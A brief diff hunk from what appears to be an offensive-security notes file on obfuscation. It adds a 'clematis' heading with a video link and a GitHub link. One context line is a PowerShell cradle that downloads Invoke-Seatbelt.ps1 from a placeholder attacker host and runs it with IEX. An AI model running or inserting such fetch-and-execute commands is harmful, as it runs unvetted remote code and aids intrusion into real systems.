@@ -562,3 +562,9 @@ $webClient.DownloadString('http://PWNIP:PWNPO/Invoke-Seatbelt.ps1') | IEX;
 
           ![image](https://github.com/mxdelta/Obfuscations/assets/121447514/61dcd2a4-5847-412e-9d92-dc9376f12fc3)
 
+
+# clematis
+
+    https://www.youtube.com/watch?v=jgx1IU9IXVE&t=203s
+
+    https://github.com/CBLabresearch/clematis?tab=readme-ov-file
